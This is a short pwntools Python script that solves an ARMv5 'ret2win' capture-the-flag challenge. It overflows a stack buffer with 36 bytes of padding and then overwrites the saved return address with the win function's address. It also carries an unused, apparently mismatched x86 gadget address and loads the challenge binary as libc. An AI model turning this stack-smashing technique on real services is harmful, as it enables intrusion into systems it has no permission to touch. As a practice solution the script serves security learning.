from pwn import *

exe = ELF('./ret2win_armv5')
context.binary = exe
context.log_level = 'info'

libc = ELF('./ret2win_armv5')

if args.REMOTE:
    io = remote('localhost', 4000)
else:
    io = process(['qemu-arm', '-L', '/usr/arm-linux-gnueabi', './ret2win_armv5'])

offset = 36 #pattern search $pc

ret2win = 0x000105ec

ret = 0x0804837e

log.info(hex(ret2win))

payload = b'A' * offset + p32(ret2win)

io.sendline(payload)

io.interactive()

